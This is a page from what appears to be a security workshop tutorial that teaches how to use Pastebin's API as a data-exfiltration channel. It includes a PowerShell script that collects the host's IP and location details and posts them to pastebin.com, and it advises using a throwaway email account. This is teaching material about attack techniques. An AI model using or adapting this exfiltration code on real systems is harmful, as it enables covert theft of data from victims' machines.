---
layout: default
title: Setup Pastebin
nav_order: 5
---
# Pastebin
[Famous website](https://pastebin.com/) for “easy copy and paste”
- It's Used in a lot of data exfiltration in companies.
- Obviously, many opensource equivalents exist, so an actual hacker will host their own pastebin.

For our workshop, we will just use a free version right now.

So go to [pastebin](https://pastebin.com/) and create a free account. Consider using [mailnesia.com](https://mailnesia.com/) if you don’t want to use your own private account.

## Get your API-key
On pastebin.com go to the API tab

Find your developer API Key, Never share this with anyone!

![Pastebin developer API Key](../images/developerapikey.png)


Create a new file named logindata.ps1 file with the code below  and copy paste your dev key into that file.

```
$DevKey     =   "PUT-DEVKEY-HERE"
$UserKey    =   "PUT-USER-KEY-HERE"
```
You don't have a UserKey yet.

## First demo

Go to the folder where you previously created logindata.ps1 and create a new file called `new-pastebin.ps1` with the code below. Open your terminal and run new-pastebin.ps1 (don't doubleclick in windows, run it via the Powershell terminal)

1. Observe the results. You will see an URL
2. Visit this URL

```
#Demo 1, Something easy. Userkey won't be used yet so everything is anonymous
. .\logindata.ps1
$Content    =   Invoke-WebRequest -Uri "https://ipinfo.io/json"
$Title      =   "pastebin1"

$Body = @{ 
    api_dev_key         = $DevKey;
    #    api_user_key        = $UserKey;
    api_paste_name	    = $Title;
    api_paste_code      = $Content;
    api_paste_private   = "0"; # 0=public 1=unlisted 2=private
    api_option          = "paste";
    }

Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```
## Preparing more advanced use of Pastebin
Thus far, so our data exiltration is public.​ Thanks to the API key we can upload to Pastebin but we need to use authentication to make it private, so let’s make it private​ 😃.

For this we need to setup our “userkey”​

This means we will use 2 keys​: 
1. Our dev key, which we already have​.
2. Our user key, which still needs creation.
